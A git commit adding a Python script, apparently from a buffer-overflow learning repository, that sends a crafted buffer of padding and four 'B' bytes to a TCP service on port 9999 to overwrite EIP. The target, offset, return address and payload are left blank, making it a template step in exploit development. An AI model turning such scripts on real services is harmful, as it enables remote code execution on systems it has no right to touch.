c58f1a7469a8fe28dd9c832b6e0e3084ae13e552
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-04-22 00:53:02 -0500

    Create overwrite.py
    Trying to establish control over EIP by overwriting it specifically with B's.

---
+++ stack-based-buffer-overflows/overwrite.py
@@ -0,0 +1,24 @@
+import socket
+
+ip = ""
+port = 9999
+
+prefix = ""
+offset = #offset here
+overflow = "A" * offset + "B" * 4
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
